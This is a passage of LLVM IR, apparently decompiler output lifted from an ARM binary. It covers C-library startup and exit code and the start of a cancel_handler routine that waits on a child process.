  store i32 1, i32* %r0.global-to-local, align 4
  %v0_2894c = load i32, i32* @r4, align 4
  store i32 %v0_2894c, i32* %r1.global-to-local, align 4
  %v2_28950 = call i32 @__check_one_fd(i32 1, i32 %v0_2894c)
  %v0_28954 = load i32, i32* @r4, align 4
  store i32 %v0_28954, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2895c = call i32 @__check_one_fd(i32 2, i32 %v0_28954)
  store i32 %v2_2895c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28960

dec_label_pc_28960:                               ; preds = %dec_label_pc_28928, %dec_label_pc_28910, %dec_label_pc_28938
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 852, i32* %r3.global-to-local, align 4
  %v2_28968 = load i32, i32* %arg3, align 4
  store i32 %v2_28968, i32* %r2.global-to-local, align 4
  %v2_2896c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_2896c, i32* %r1.global-to-local, align 4
  %v3_28970 = add i32 %v2_2896c, 852
  %v4_28970 = inttoptr i32 %v3_28970 to i32*
  store i32 %v2_28968, i32* %v4_28970, align 4
  %v0_28974 = load i32, i32* %r0.global-to-local, align 4
  %v1_28974 = inttoptr i32 %v0_28974 to i32*
  %v2_28974 = load i32, i32* %v1_28974, align 4
  store i32 %v2_28974, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28978 = icmp eq i32 %v2_28974, 0
  store i1 %v2_28978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28978, label %bb84, label %dec_label_pc_28980

dec_label_pc_28980:                               ; preds = %dec_label_pc_28960
  store i32 180, i32* %r3.global-to-local, align 4
  %v0_28984 = load i32, i32* %r1.global-to-local, align 4
  %v2_28984 = add i32 %v0_28984, 180
  %v3_28984 = inttoptr i32 %v2_28984 to i32*
  %v4_28984 = load i32, i32* %v3_28984, align 4
  store i32 %v4_28984, i32* %r3.global-to-local, align 4
  %v2_28988 = inttoptr i32 %v4_28984 to i32*
  store i32 %v2_28974, i32* %v2_28988, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_28990 = load i32, i32* %r0.global-to-local, align 4
  %v1_28990 = inttoptr i32 %v0_28990 to i32*
  %v2_28990 = load i32, i32* %v1_28990, align 4
  store i32 %v2_28990, i32* %r0.global-to-local, align 4
  %v4_28994 = call i32 @__GI_strrchr(i32 %v2_28990, i32 47, i32 %v2_28968, i32 %v4_28984)
  store i32 %v4_28994, i32* %r0.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_2899c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_2899c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_289a0 = icmp eq i32 %v4_28994, 0
  store i1 %v2_289a0, i1* %cpsr_z.global-to-local, align 1
  %v2_289a4 = add i32 %v2_2899c, 108
  %v3_289a4 = inttoptr i32 %v2_289a4 to i32*
  %v4_289a4 = load i32, i32* %v3_289a4, align 4
  store i32 %v4_289a4, i32* %r2.global-to-local, align 4
  br i1 %v2_289a0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_28980
  %v2_289ac58 = inttoptr i32 %v4_289a4 to i32*
  store i32 0, i32* %v2_289ac58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_28980
  %v2_289a8 = add i32 %v4_28994, 1
  store i32 %v2_289a8, i32* %r3.global-to-local, align 4
  %v2_289ac = inttoptr i32 %v4_289a4 to i32*
  store i32 %v4_28994, i32* %v2_289ac, align 4
  %v1_289b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_289b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_289b0 = inttoptr i32 %v2_289b0 to i32*
  store i32 %v1_289b0, i32* %v3_289b0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_28960
  %v2_289c0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_289c0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_289cc = add i32 %v2_289c0, -32
  store i32 %v2_289cc, i32* %r5.global-to-local, align 4
  store i32 27416, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_289dc = add i32 %v2_289c0, 27416
  %v4_289dc = inttoptr i32 %v3_289dc to i32*
  store i32 %arg5, i32* %v4_289dc, align 4
  %v0_289f418 = load i32, i32* %r4.global-to-local, align 4
  %v1_289f419 = load i32, i32* %r7.global-to-local, align 4
  %v3_289f421 = icmp uge i32 %v0_289f418, %v1_289f419
  store i1 %v3_289f421, i1* %cpsr_c.global-to-local, align 1
  %v9_289f427 = icmp eq i32 %v0_289f418, %v1_289f419
  store i1 %v9_289f427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_289f421, label %dec_label_pc_28a28.lr.ph, label %dec_label_pc_289e4

dec_label_pc_289e4:                               ; preds = %bb84, %dec_label_pc_289e4
  %v1_289e4 = phi i32 [ %v1_289f0, %dec_label_pc_289e4 ], [ %v0_289f418, %bb84 ]
  %v0_289e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_289e4 = and i32 %v1_289e4, 1073741824
  %v3_289e4 = icmp ne i32 %v2_289e4, 0
  store i1 %v3_289e4, i1* %cpsr_c.global-to-local, align 1
  %v4_289e4 = mul i32 %v1_289e4, 4
  %v5_289e4 = add i32 %v4_289e4, %v0_289e4
  %v6_289e4 = inttoptr i32 %v5_289e4 to i32*
  %v7_289e4 = load i32, i32* %v6_289e4, align 4
  store i32 %v7_289e4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_289e4)
  %v0_289f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_289f0 = add i32 %v0_289f0, 1
  store i32 %v1_289f0, i32* %r4.global-to-local, align 4
  %v1_289f4 = load i32, i32* %r7.global-to-local, align 4
  %v3_289f4 = icmp uge i32 %v1_289f0, %v1_289f4
  store i1 %v3_289f4, i1* %cpsr_c.global-to-local, align 1
  %v9_289f4 = icmp eq i32 %v1_289f0, %v1_289f4
  store i1 %v9_289f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_289f4, label %dec_label_pc_28a28.lr.ph, label %dec_label_pc_289e4

dec_label_pc_28a28.lr.ph:                         ; preds = %dec_label_pc_289e4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_289fc = icmp eq i32 %v0_28848, 0
  store i1 %v2_289fc, i1* %cpsr_z.global-to-local, align 1
  %v2_28a04 = xor i1 %v2_289fc, true
  call void @__pseudo_cond_branch(i1 %v2_28a04, i32 %v0_28848)
  store i32 -32, i32* %r2.global-to-local, align 4
  %v2_28a10 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_28a1c = add i32 %v2_28a10, -32
  store i32 %v2_28a1c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_28a28

dec_label_pc_28a28:                               ; preds = %dec_label_pc_28a28.dec_label_pc_28a28_crit_edge, %dec_label_pc_28a28.lr.ph
  %v1_28a28 = phi i32 [ %v1_28a34, %dec_label_pc_28a28.dec_label_pc_28a28_crit_edge ], [ 0, %dec_label_pc_28a28.lr.ph ]
  %v0_28a28 = phi i32 [ %v0_28a28.pre, %dec_label_pc_28a28.dec_label_pc_28a28_crit_edge ], [ %v2_28a1c, %dec_label_pc_28a28.lr.ph ]
  %v2_28a28 = and i32 %v1_28a28, 1073741824
  %v3_28a28 = icmp ne i32 %v2_28a28, 0
  store i1 %v3_28a28, i1* %cpsr_c.global-to-local, align 1
  %v4_28a28 = mul i32 %v1_28a28, 4
  %v5_28a28 = add i32 %v4_28a28, %v0_28a28
  %v6_28a28 = inttoptr i32 %v5_28a28 to i32*
  %v7_28a28 = load i32, i32* %v6_28a28, align 4
  store i32 %v7_28a28, i32* %ip.global-to-local, align 4
  store i32 166452, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_28a28)
  %v0_28a34 = load i32, i32* @r4, align 4
  %v1_28a34 = add i32 %v0_28a34, 1
  store i32 %v1_28a34, i32* @r4, align 4
  %v1_28a38 = load i32, i32* @r7, align 4
  %v3_28a38 = icmp uge i32 %v1_28a34, %v1_28a38
  store i1 %v3_28a38, i1* %cpsr_c.global-to-local, align 1
  %v9_28a38 = icmp eq i32 %v1_28a34, %v1_28a38
  store i1 %v9_28a38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_28a38, label %dec_label_pc_28a40, label %dec_label_pc_28a28.dec_label_pc_28a28_crit_edge

dec_label_pc_28a28.dec_label_pc_28a28_crit_edge:  ; preds = %dec_label_pc_28a28
  %v0_28a28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_28a28

dec_label_pc_28a40:                               ; preds = %dec_label_pc_28a28
  %v2_28a44.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_28a44.pre, i32* %r0.global-to-local, align 4
  %v2_28a48 = add i32 %v2_28a44.pre, -128440
  store i32 %v2_28a48, i32* %r2.global-to-local, align 4
  store i32 %v2_28a48, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28a50 = icmp eq i32 %v2_28a48, 0
  store i1 %v2_28a50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28a50, label %dec_label_pc_28a68, label %dec_label_pc_28a58

dec_label_pc_28a58:                               ; preds = %dec_label_pc_28a40
  store i32 166496, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_28a48)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_28a64 = load i32, i32* %r0.global-to-local, align 4
  %v2_28a64 = inttoptr i32 %v1_28a64 to i32*
  store i32 0, i32* %v2_28a64, align 4
  %v2_28a6c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_28a68

dec_label_pc_28a68:                               ; preds = %dec_label_pc_28a40, %dec_label_pc_28a58
  %v2_28a6c = phi i32 [ %v2_28a44.pre, %dec_label_pc_28a40 ], [ %v2_28a6c.pre, %dec_label_pc_28a58 ]
  store i32 140, i32* %r3.global-to-local, align 4
  store i32 %v2_28a6c, i32* %r1.global-to-local, align 4
  %v2_28a70 = add i32 %v2_28a6c, 140
  %v3_28a70 = inttoptr i32 %v2_28a70 to i32*
  %v4_28a70 = load i32, i32* %v3_28a70, align 4
  store i32 %v4_28a70, i32* %r2.global-to-local, align 4
  store i32 %v4_28a70, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28a78 = icmp eq i32 %v4_28a70, 0
  store i1 %v2_28a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28a78, label %dec_label_pc_28a90, label %dec_label_pc_28a80

dec_label_pc_28a80:                               ; preds = %dec_label_pc_28a68
  store i32 166536, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_28a70)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_28a8c = load i32, i32* %r0.global-to-local, align 4
  %v2_28a8c = inttoptr i32 %v1_28a8c to i32*
  store i32 0, i32* %v2_28a8c, align 4
  br label %dec_label_pc_28a90

dec_label_pc_28a90:                               ; preds = %dec_label_pc_28a68, %dec_label_pc_28a80
  %v2_28a90 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_28a90, i32* @r0, align 4
  %v1_28a94 = call i32 @_setjmp(i32 %v2_28a90)
  store i32 %v1_28a94, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28a98 = icmp eq i32 %v1_28a94, 0
  store i1 %v2_28a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28a98, label %dec_label_pc_28aa0, label %dec_label_pc_28aec

dec_label_pc_28aa0:                               ; preds = %dec_label_pc_28a90
  %v0_28aa0 = call i32 @__aeabi_read_tp()
  store i32 %v0_28aa0, i32* %r0.global-to-local, align 4
  %v1_28aa4 = add i32 %v0_28aa0, -1168
  store i32 %v1_28aa4, i32* %r2.global-to-local, align 4
  %v2_28aac = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_28aac, i32* %r4.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_28ab8 = add i32 %v2_28aac, 64
  %v3_28ab8 = inttoptr i32 %v2_28ab8 to i32*
  %v4_28ab8 = load i32, i32* %v3_28ab8, align 4
  store i32 %v4_28ab8, i32* %ip.global-to-local, align 4
  store i32 %v2_28a90, i32* %r3.global-to-local, align 4
  %v2_28ac8 = add i32 %v0_28aa0, -1040
  %v3_28ac8 = inttoptr i32 %v2_28ac8 to i32*
  store i32 %v2_28a90, i32* %v3_28ac8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_28ad4 = load i32, i32* %ip.global-to-local, align 4
  %v1_28ad4 = inttoptr i32 %v0_28ad4 to i32*
  %v2_28ad4 = load i32, i32* %v1_28ad4, align 4
  store i32 %v2_28ad4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_28ae4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28b88

dec_label_pc_28aec:                               ; preds = %dec_label_pc_28a90
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_28af0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_28af0, i32* %ip.global-to-local, align 4
  %v2_28af4 = add i32 %v2_28af0, 48
  %v3_28af4 = inttoptr i32 %v2_28af4 to i32*
  %v4_28af4 = load i32, i32* %v3_28af4, align 4
  store i32 %v4_28af4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_28af4)
  store i32 132, i32* %r3.global-to-local, align 4
  %v2_28b04 = load i32, i32* %stack_var_-416, align 4
  %v2_28b08 = add i32 %v2_28b04, 132
  %v3_28b08 = inttoptr i32 %v2_28b08 to i32*
  %v4_28b08 = load i32, i32* %v3_28b08, align 4
  store i32 %v4_28b08, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_28b0c

dec_label_pc_28b0c:                               ; preds = %dec_label_pc_28b40.dec_label_pc_28b0c_crit_edge, %dec_label_pc_28aec
  %v0_28b0c = phi i32 [ %v0_28b0c.pre, %dec_label_pc_28b40.dec_label_pc_28b0c_crit_edge ], [ %v4_28b08, %dec_label_pc_28aec ]
  %v1_28b0c = inttoptr i32 %v0_28b0c to i32*
  %v2_28b0c = load i32, i32* %v1_28b0c, align 4
  store i32 %v0_28b0c, i32* %r2.global-to-local, align 4
  store i32 %v2_28b0c, i32* %r4.global-to-local, align 4
  %v1_28b18 = add i32 %v2_28b0c, -1
  store i32 %v1_28b18, i32* %r1.global-to-local, align 4
  %v2_28b1c88 = load i32, i32* %v1_28b0c, align 4
  store i32 %v2_28b1c88, i32* %r3.global-to-local, align 4
  %v3_28b2090 = icmp uge i32 %v2_28b1c88, %v2_28b0c
  store i1 %v3_28b2090, i1* %cpsr_c.global-to-local, align 1
  %v9_28b2096 = icmp eq i32 %v2_28b1c88, %v2_28b0c
  store i1 %v9_28b2096, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_28b2096, label %dec_label_pc_28b28, label %dec_label_pc_28b40

dec_label_pc_28b28:                               ; preds = %dec_label_pc_28b0c, %dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge
  %v0_28b2897 = phi i32 [ %v1_28b20.pre, %dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge ], [ %v2_28b0c, %dec_label_pc_28b0c ]
  store i32 %v0_28b2897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28b38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28b38, label %dec_label_pc_28b3c, label %dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge

dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge:  ; preds = %dec_label_pc_28b28
  %v0_28b1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28b20.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28b1c = inttoptr i32 %v0_28b1c.pre to i32*
  %v2_28b1c = load i32, i32* %v1_28b1c, align 4
  store i32 %v2_28b1c, i32* %r3.global-to-local, align 4
  %v3_28b20 = icmp uge i32 %v2_28b1c, %v1_28b20.pre
  store i1 %v3_28b20, i1* %cpsr_c.global-to-local, align 1
  %v9_28b20 = icmp eq i32 %v2_28b1c, %v1_28b20.pre
  store i1 %v9_28b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_28b20, label %dec_label_pc_28b28, label %dec_label_pc_28b40

dec_label_pc_28b3c:                               ; preds = %dec_label_pc_28b28
  %v0_28b3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28b3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28b40

dec_label_pc_28b40:                               ; preds = %dec_label_pc_28b0c, %dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge, %dec_label_pc_28b3c
  %v0_28b48 = phi i32 [ %v0_28b3c, %dec_label_pc_28b3c ], [ %v2_28b1c88, %dec_label_pc_28b0c ], [ %v2_28b1c, %dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge ]
  %v1_28b40 = phi i32 [ %v0_28b3c, %dec_label_pc_28b3c ], [ %v2_28b0c, %dec_label_pc_28b0c ], [ %v1_28b20.pre, %dec_label_pc_28b28.dec_label_pc_28b1c_crit_edge ]
  %v3_28b40 = icmp uge i32 %v0_28b48, %v1_28b40
  store i1 %v3_28b40, i1* %cpsr_c.global-to-local, align 1
  %v9_28b40 = icmp eq i32 %v0_28b48, %v1_28b40
  store i1 %v9_28b40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_28b40, label %dec_label_pc_28b48, label %dec_label_pc_28b40.dec_label_pc_28b0c_crit_edge

dec_label_pc_28b40.dec_label_pc_28b0c_crit_edge:  ; preds = %dec_label_pc_28b40
  %v0_28b0c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_28b0c

dec_label_pc_28b48:                               ; preds = %dec_label_pc_28b40
  %v2_28b48 = icmp ne i32 %v1_28b40, 0
  store i1 %v2_28b48, i1* %cpsr_c.global-to-local, align 1
  %v7_28b48 = icmp eq i32 %v1_28b40, 1
  store i1 %v7_28b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_28b48, label %dec_label_pc_28b88, label %dec_label_pc_28b50

dec_label_pc_28b50:                               ; preds = %dec_label_pc_28b48
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28b88

dec_label_pc_28b88:                               ; preds = %dec_label_pc_28b48, %dec_label_pc_28b50, %dec_label_pc_28aa0
  %storemerge2 = phi i32 [ %v0_28ae4, %dec_label_pc_28aa0 ], [ 0, %dec_label_pc_28b50 ], [ 0, %dec_label_pc_28b48 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_28b8c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_28b8c, i32* %r0.global-to-local, align 4
  %v0_28b90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_28b90, label %.thread8, label %.thread9

.thread8:                                         ; preds = %dec_label_pc_28b88
  %v2_28ba0 = load i32, i32* %r4.global-to-local, align 4
  %v3_28ba8 = load i32, i32* %r3.global-to-local, align 4
  %v4_28ba8 = add i32 %v3_28ba8, -1
  %v5_28ba8 = shl i32 1, %v4_28ba8
  %v6_28ba8 = and i32 %v5_28ba8, %v2_28ba0
  %v7_28ba8 = icmp ne i32 %v6_28ba8, 0
  store i1 %v7_28ba8, i1* %cpsr_c.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread9:                                         ; preds = %dec_label_pc_28b88
  ret i32 %v1_28b8c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_28b40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_28b3c, { 1, 0, 2 }
  uselistorder i32 %v1_28b20.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_28b0c, { 1, 0 }
  uselistorder i32 %v2_28a6c, { 1, 0 }
  uselistorder i32 %v2_28a44.pre, { 2, 0, 1 }
  uselistorder i32 %v1_28a38, { 1, 0 }
  uselistorder i32 %v1_28a34, { 3, 2, 1, 0 }
  uselistorder i32 %v1_28a28, { 1, 0 }
  uselistorder i32 %v1_289f4, { 1, 0 }
  uselistorder i32 %v1_289f0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_289e4, { 1, 0 }
  uselistorder i32 %v2_289c0, { 1, 0, 2 }
  uselistorder i32 %v4_289a4, { 1, 0, 2 }
  uselistorder i32 %v4_28994, { 1, 0, 2, 3 }
  uselistorder i1 %v8_288dc, { 1, 2, 0 }
  uselistorder i32 %v2_288a8, { 1, 2, 0 }
  uselistorder i32 %v1_288a4, { 1, 2, 0 }
  uselistorder i1 %v2_28890, { 1, 0, 2 }
  uselistorder i32 %v5_28894, { 1, 0, 2, 3 }
  uselistorder i32 %v2_28860, { 1, 0, 2, 3 }
  uselistorder i32 %v0_28848, { 1, 0, 2 }
  uselistorder i32 %v2_2883c, { 1, 0, 2 }
  uselistorder i32 %v3_2880c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 9, 4, 6, 5, 3, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 2, 27, 28, 29, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 1, 2, 3, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 6, 7, 8, 9, 13, 10, 11, 12, 18, 14, 15, 16, 17, 20, 19, 21, 22, 1, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 132, { 0, 1, 4, 5, 6, 7, 2, 3 }
  uselistorder i32 108, { 0, 1, 3, 4, 5, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 27420, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28b88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28b40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28b28, { 1, 0 }
  uselistorder label %dec_label_pc_28a90, { 1, 0 }
  uselistorder label %dec_label_pc_28a68, { 1, 0 }
  uselistorder label %dec_label_pc_289e4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28960, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28938, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_288a8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_28890, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @cancel_handler(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_28bdc = load i32, i32* @r4, align 4
  store i32 %v3_28bdc, i32* %stack_var_-20, align 4
  %v2_28be0 = load i32, i32* %arg1, align 4
  store i32 %v2_28be0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  store i32 %v2_28be0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 37, i32* @r7, align 4
  store i32 105740, i32* @r6, align 4
  br label %dec_label_pc_28c04

dec_label_pc_28c04:                               ; preds = %dec_label_pc_28c1c.dec_label_pc_28c04_crit_edge, %entry
  %v0_28c08 = phi i32 [ %v0_28c08.pre, %dec_label_pc_28c1c.dec_label_pc_28c04_crit_edge ], [ %v2_28be0, %entry ]
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_28c08, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_28c10 = call i32 @__libc_waitpid(i32 %v0_28c08, i32 0, i32 0)
  store i32 %v3_28c10, i32* %r0.global-to-local, align 4
  %v3_28c14 = icmp eq i32 %v3_28c10, -1
  store i1 %v3_28c14, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_28c14, label %dec_label_pc_28c1c, label %dec_label_pc_28c30

dec_label_pc_28c1c:                               ; preds = %dec_label_pc_28c04
  %v0_28c1c = call i32 @__aeabi_read_tp()
  store i32 %v0_28c1c, i32* %r0.global-to-local, align 4
  %v3_28c20 = load i16, i16* @global_var_42934.3040, align 2
  %v4_28c20 = sext i16 %v3_28c20 to i32
  %v2_28c24 = add i32 %v4_28c20, %v0_28c1c
  %v3_28c24 = inttoptr i32 %v2_28c24 to i32*
  %v4_28c24 = load i32, i32* %v3_28c24, align 4
  %v2_28c28 = icmp ugt i32 %v4_28c24, 3
  store i1 %v2_28c28, i1* %cpsr_c.global-to-local, align 1
  %v7_28c28 = icmp eq i32 %v4_28c24, 4
  br i1 %v7_28c28, label %dec_label_pc_28c1c.dec_label_pc_28c04_crit_edge, label %dec_label_pc_28c30

dec_label_pc_28c1c.dec_label_pc_28c04_crit_edge:  ; preds = %dec_label_pc_28c1c
  %v0_28c08.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_28c04

dec_label_pc_28c30:                               ; preds = %dec_label_pc_28c04, %dec_label_pc_28c1c
  store i32 27468, i32* @r7, align 4
  %v0_28c34 = load i32, i32* @r5, align 4
  %v2_28c34 = add i32 %v0_28c34, 27468
  store i32 %v2_28c34, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_28c34, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_28c4435 = inttoptr i32 %v2_28c34 to i32*
  %v2_28c4436 = load i32, i32* %v1_28c4435, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_28c4838 = icmp eq i32 %v2_28c4436, 0
  br i1 %v9_28c4838, label %dec_label_pc_28c50, label %dec_label_pc_28c68

dec_label_pc_28c50:                               ; preds = %dec_label_pc_28c30, %dec_label_pc_28c50.dec_label_pc_28c44_crit_edge
  %v0_28c5039 = phi i32 [ %v1_28c48.pre, %dec_label_pc_28c50.dec_label_pc_28c44_crit_edge ], [ 0, %dec_label_pc_28c30 ]
  store i32 %v0_28c5039, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28c60 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28c60, label %dec_label_pc_28c64, label %dec_label_pc_28c50.dec_label_pc_28c44_crit_edge

dec_label_pc_28c50.dec_label_pc_28c44_crit_edge:  ; preds = %dec_label_pc_28c50
  %v0_28c44.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28c48.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28c44 = inttoptr i32 %v0_28c44.pre to i32*
  %v2_28c44 = load i32, i32* %v1_28c44, align 4
  %v3_28c48 = icmp uge i32 %v2_28c44, %v1_28c48.pre
  store i1 %v3_28c48, i1* %cpsr_c.global-to-local, align 1
